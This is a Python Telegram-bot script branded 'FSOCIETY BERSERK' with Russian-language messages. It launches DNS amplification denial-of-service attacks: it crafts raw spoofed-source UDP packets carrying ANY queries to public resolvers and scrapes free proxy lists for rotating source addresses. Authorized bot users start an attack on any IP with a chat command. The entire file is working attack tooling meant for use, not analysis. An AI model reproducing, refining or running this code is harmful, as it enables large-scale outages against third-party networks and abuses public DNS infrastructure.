#!/usr/bin/env python3
# ███████╗███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# █████╗  ███████╗██║   ██║██║     ██║███████╗   ██║    ╚████╔╝ 
# ██╔══╝  ╚════██║██║   ██║██║     ██║╚════██║   ██║     ╚██╔╝  
# ███████║███████║╚██████╔╝╚██████╗██║███████║   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   
#              BERSERK ASYNC EDITION — 1.2M PPS
#              48 CORES | 384 GB RAM | 5000+ PROXIES

import os
import sys
import time
import socket
import struct
import threading
import asyncio
import random
import psutil
import requests
import re
from datetime import datetime
from collections import defaultdict

# ========== ТЕЛЕГРАМ ==========
import telebot
from telebot.types import Message

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = os.getenv('BOT_TOKEN')
if not BOT_TOKEN:
    print("❌ FSOCIETY: ТОКЕН НЕ УСТАНОВЛЕН")
    sys.exit(1)

ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '').split(',') if x.strip()]
authorized_users = ADMIN_IDS.copy()
active_attacks = {}

bot = telebot.TeleBot(BOT_TOKEN)

# ========== РАСЧЁТ ПОД ЖЕЛЕЗО ==========
CPU_CORES = os.cpu_count() or 48
RAM_GB = psutil.virtual_memory().total / (1024**3)

# МЕГА-ПАРАМЕТРЫ
ASYNC_WORKERS = CPU_CORES * 25000  # 1 200 000 асинхронных задач
SYNC_THREADS = CPU_CORES * 5000    # 240 000 синхронных потоков
PACKETS_PER_SECOND = 1200000       # 1.2 млн пакетов/сек
BURST_SIZE = 100000                # 100 000 пакетов за раз
SOCKETS_PER_WORKER = 20             # 20 сокетов на воркер

print(f"⚡ CPU: {CPU_CORES} ядер")
print(f"🧠 RAM: {RAM_GB:.1f} ГБ")
print(f"🚀 Асинхронных задач: {ASYNC_WORKERS}")
print(f"🔥 Синхронных потоков: {SYNC_THREADS}")
print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")

# ========== ГИГАНТСКИЙ ПУЛ ПРОКСИ (5000+) ==========
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.proxy_index = 0
        self.lock = threading.Lock()
        
        # Мега-список источников прокси
        self.proxy_sources = [
            # HTTP прокси
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http/data.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/https/data.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            
            # SOCKS4 прокси
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4/data.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
            
            # SOCKS5 прокси
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5/data.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
            
            # Scrape API
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
            
            # Дополнительные источники
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        ]
        
    def load_proxies(self):
        """Загрузка прокси из всех источников"""
        print("🌐 Загрузка прокси...")
        all_proxies = []
        
        for url in self.proxy_sources:
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    # Ищем IP:PORT в тексте
                    proxies = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d{2,5}\b", r.text)
                    all_proxies.extend(proxies)
                    print(f"  • {url.split('/')[-1][:30]}: {len(proxies)} прокси")
            except Exception as e:
                print(f"  ⚠️ Ошибка загрузки {url[:30]}: {e}")
        
        # Убираем дубликаты и перемешиваем
        self.proxies = list(set(all_proxies))
        random.shuffle(self.proxies)
        
        # Оставляем только первые 5000 для производительности
        if len(self.proxies) > 5000:
            self.proxies = self.proxies[:5000]
        
        print(f"\n✅ Всего загружено: {len(self.proxies)} уникальных прокси")
        return self.proxies
    
    def get_next_proxy_ip(self):
        """Получение следующего прокси для подмены source IP"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return proxy.split(':')[0]  # берём только IP

proxy_mgr = ProxyManager()
PROXY_LIST = proxy_mgr.load_proxies()
print(f"🌐 Используем {len(PROXY_LIST)} прокси")

# ========== ГИГАНТСКИЙ ПУЛ DNS СЕРВЕРОВ ==========
DNS_SERVERS = [
    '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
    '94.140.14.14', '94.140.15.15', '185.228.168.9', '185.228.169.9',
    '76.76.19.19', '76.223.122.150', '64.6.64.6', '64.6.65.6',
    '8.26.56.26', '8.20.247.20', '156.154.70.1', '156.154.71.1',
    '77.88.8.8', '77.88.8.1', '208.91.112.53', '208.91.112.52',
]

DNS_POOL = DNS_SERVERS * 200
random.shuffle(DNS_POOL)
print(f"🌐 DNS серверов: {len(DNS_POOL)}")

# ========== DNS QUERY (x70 УСИЛЕНИЕ) ==========
def create_query(domain='example.com'):
    parts = domain.split('.')
    domain_part = b''
    for part in parts:
        domain_part += bytes([len(part)]) + part.encode()
    domain_part += b'\x00'
    
    tid = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    header = struct.pack('!HHHHHH', tid, flags, questions, 0, 0, 0)
    qtype = 255  # ANY
    qclass = 1
    edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
    
    return header + domain_part + struct.pack('!HH', qtype, qclass) + edns

QUERY = create_query()

# ========== АСИНХРОННЫЙ DNS ВОРКЕР С ПРОКСИ ==========
class AsyncDNSWorker:
    def __init__(self):
        self.running = False
        self.packets = 0
        self.bytes = 0
        self.lock = asyncio.Lock()
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        
    async def worker(self, target_ip, duration, worker_id):
        """Асинхронный воркер с ротацией прокси"""
        loop = asyncio.get_event_loop()
        socks = []
        
        # Создаём пул сокетов
        for _ in range(SOCKETS_PER_WORKER):
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setblocking(False)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576 * 64)
            socks.append(sock)
        
        # Прегенерация UDP заголовков
        udp_headers = []
        for _ in range(10000):
            src = random.randint(1024, 65535)
            udp_headers.append(struct.pack('!HHHH', src, 53, 8 + len(QUERY), 0))
        
        end = time.time() + duration
        local_packets = 0
        local_bytes = 0
        packet_counter = 0
        
        while time.time() < end and self.running:
            try:
                # Каждые 1000 пакетов меняем прокси
                if packet_counter % 1000 == 0:
                    fake_ip = proxy_mgr.get_next_proxy_ip()
                    if fake_ip:
                        ip_hdr = struct.pack('!BBHHHBBH4s4s',
                            0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
                            socket.inet_aton(fake_ip),
                            socket.inet_aton(target_ip)
                        )
                    else:
                        ip_hdr = struct.pack('!BBHHHBBH4s4s',
                            0x45, 0, 40 + len(QUERY), 0, 0, 0, 64, 17, 0,
                            socket.inet_aton('0.0.0.0'),
                            socket.inet_aton(target_ip)
                        )
                
                for _ in range(BURST_SIZE):
                    sock = random.choice(socks)
                    udp = random.choice(udp_headers)
                    dns = random.choice(DNS_POOL)
                    
                    await loop.sock_sendto(sock, ip_hdr + udp + QUERY, (dns, 53))
                    
                    local_packets += 1
                    packet_counter += 1
                    local_bytes += len(ip_hdr) + len(udp) + len(QUERY)
                    
                    if local_packets >= 10000:
                        async with self.lock:
                            self.packets += local_packets
                            self.bytes += local_bytes
                        local_packets = 0
                        local_bytes = 0
                        
            except Exception as e:
                continue
        
        if local_packets > 0:
            async with self.lock:
                self.packets += local_packets
                self.bytes += local_bytes
        
        for sock in socks:
            sock.close()
    
    async def run_attack(self, target_ip, duration):
        self.running = True
        self.packets = 0
        self.bytes = 0
        start = time.time()
        
        print(f"\n⚡ ЗАПУСК АСИНХРОННОЙ АТАКИ")
        print(f"🔥 Асинхронных задач: {ASYNC_WORKERS}")
        print(f"🌐 Прокси в ротации: {len(PROXY_LIST)}")
        
        tasks = []
        for i in range(ASYNC_WORKERS):
            task = asyncio.create_task(self.worker(target_ip, duration, i))
            tasks.append(task)
        
        monitor_task = asyncio.create_task(self.monitor(duration))
        await asyncio.gather(*tasks, return_exceptions=True)
        self.running = False
        
        elapsed = time.time() - start
        gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
        
        return {
            'packets': self.packets,
            'bytes': self.bytes,
            'gbps': gbps,
            'target_gbps': gbps * 70,
            'duration': elapsed
        }
    
    async def monitor(self, duration):
        start = time.time()
        while self.running:
            elapsed = time.time() - start
            if elapsed > 0 and elapsed < duration:
                gbps = (self.bytes * 8) / 1_000_000_000 / max(elapsed, 0.1)
                target_gbps = gbps * 70
                pps = self.packets / max(elapsed, 0.1)
                
                print(f"\r⚡ {gbps:.2f} Гбит/с | "
                      f"🎯 {target_gbps:.1f} Гбит/с | "
                      f"📦 {pps:.0f} п/с | "
                      f"🌐 Прокси: {proxy_mgr.proxy_index} | "
                      f"⏱ {duration - elapsed:.0f} сек", end='')
            await asyncio.sleep(1)

# ========== ПРОВЕРКА ПРАВ ==========
def is_auth(user_id):
    return user_id in authorized_users

def is_admin(user_id):
    return user_id in ADMIN_IDS

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start', 'fsociety'])
def cmd_start(m):
    uid = m.from_user.id
    if not is_auth(uid):
        bot.reply_to(m, "❌ FSOCIETY: ДОСТУП ЗАПРЕЩЕН")
        return
    
    text = f"""
╔══════════════════════════════════════╗
║     ███████╗███████╗ ██████╗ ██████╗ ║
║     ██╔════╝██╔════╝██╔═══██╗██╔══██╗║
║     █████╗  ███████╗██║   ██║██████╔╝║
║     ██╔══╝  ╚════██║██║   ██║██╔══██╗║
║     ██║     ███████║╚██████╔╝██║  ██║║
║     ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝║
║         BERSERK ASYNC EDITION        ║
╚══════════════════════════════════════╝

👤 ID: {uid}
⚡ CPU: {CPU_CORES} ядер
🧠 RAM: {RAM_GB:.1f} ГБ
🚀 Асинхронных задач: {ASYNC_WORKERS}
🌐 Прокси в ротации: {len(PROXY_LIST)}
📦 Цель: 1 200 000 пакетов/сек

/berserk <ip> <сек> - запустить атаку
/proxies - статус прокси
/stop - остановить
/status - статус
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['proxies'])
def cmd_proxies(m):
    if not is_auth(m.from_user.id):
        return
    
    text = f"""
🌐 **СТАТИСТИКА ПРОКСИ**

📊 Всего загружено: {len(PROXY_LIST)}
🔄 Текущий индекс: {proxy_mgr.proxy_index}
✅ Активно в ротации: {min(proxy_mgr.proxy_index, len(PROXY_LIST))}

🔍 Первые 10 прокси:
{chr(10).join(PROXY_LIST[:10])}
"""
    bot.reply_to(m, text)

@bot.message_handler(commands=['berserk'])
def cmd_berserk(m):
    if not is_auth(m.from_user.id):
        bot.reply_to(m, "❌ Доступ запрещен")
        return
    
    try:
        parts = m.text.split()
        if len(parts) < 3:
            bot.reply_to(m, "❌ /berserk <ip> <сек>")
            return
        
        target_ip = parts[1]
        duration = int(parts[2])
        
        socket.inet_aton(target_ip)
        
        bot.reply_to(m, f"""
🔥 БЕРСЕРК АТАКА ЗАПУЩЕНА

🎯 IP: {target_ip}
⏱ Длительность: {duration} сек
⚡ Асинхронных задач: {ASYNC_WORKERS}
🌐 Прокси: {len(PROXY_LIST)}
📦 Цель: 1.2 млн пакетов/сек
⚡ Ожидаемая скорость: 1200+ Гбит/с
        """)
        
        active_attacks[m.chat.id] = {'running': True}
        
        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            worker = AsyncDNSWorker()
            result = loop.run_until_complete(worker.run_attack(target_ip, duration))
            
            if m.chat.id in active_attacks:
                del active_attacks[m.chat.id]
                
                bot.send_message(m.chat.id, f"""
✅ БЕРСЕРК АТАКА ЗАВЕРШЕНА

📦 Всего пакетов: {result['packets']:,}
⚡ Твоя скорость: {result['gbps']:.2f} Гбит/с
🎯 Жертва получала: {result['target_gbps']:.1f} Гбит/с
🌐 Прокси использовано: {proxy_mgr.proxy_index}
⏱ Длительность: {result['duration']:.0f} сек
                """)
            
            loop.close()
        
        threading.Thread(target=run_async).start()
        
    except Exception as e:
        bot.reply_to(m, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['stop'])
def cmd_stop(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        active_attacks[m.chat.id]['running'] = False
        del active_attacks[m.chat.id]
        bot.reply_to(m, "🛑 АТАКА ОСТАНОВЛЕНА")
    else:
        bot.reply_to(m, "❌ Нет активной атаки")

@bot.message_handler(commands=['status'])
def cmd_status(m):
    if not is_auth(m.from_user.id):
        return
    
    if m.chat.id in active_attacks:
        bot.reply_to(m, "⚡ АТАКА АКТИВНА")
    else:
        bot.reply_to(m, "💤 НЕТ АКТИВНЫХ АТАК")

# ========== АДМИН ==========
@bot.message_handler(commands=['add'])
def cmd_add(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid not in authorized_users:
            authorized_users.append(uid)
            bot.reply_to(m, f"✅ Добавлен {uid}")
    except:
        bot.reply_to(m, "❌ /add <id>")

@bot.message_handler(commands=['remove'])
def cmd_remove(m):
    if not is_admin(m.from_user.id):
        return
    
    try:
        uid = int(m.text.split()[1])
        if uid in ADMIN_IDS:
            bot.reply_to(m, "❌ Нельзя удалить админа")
        elif uid in authorized_users:
            authorized_users.remove(uid)
            bot.reply_to(m, f"✅ Удален {uid}")
    except:
        bot.reply_to(m, "❌ /remove <id>")

@bot.message_handler(commands=['reload_proxies'])
def cmd_reload(m):
    if not is_admin(m.from_user.id):
        return
    
    bot.reply_to(m, "🔄 Перезагрузка прокси...")
    global PROXY_LIST
    PROXY_LIST = proxy_mgr.load_proxies()
    bot.reply_to(m, f"✅ Загружено {len(PROXY_LIST)} прокси")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("="*70)
    print("🔥 FSOCIETY BERSERK ASYNC — 1.2M PACKETS/SEC 🔥")
    print("="*70)
    print(f"🤖 Бот: @{bot.get_me().username}")
    print(f"⚡ Асинхронных задач: {ASYNC_WORKERS}")
    print(f"🌐 Прокси загружено: {len(PROXY_LIST)}")
    print(f"📦 Цель: {PACKETS_PER_SECOND} пакетов/сек")
    print(f"🎯 С усилением x70: {PACKETS_PER_SECOND * 70 * 1500 * 8 / 1_000_000_000:.0f} Гбит/с")
    
    try:
        import requests
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
        print("✅ Вебхук удален")
    except:
        pass
    
    bot.infinity_polling()
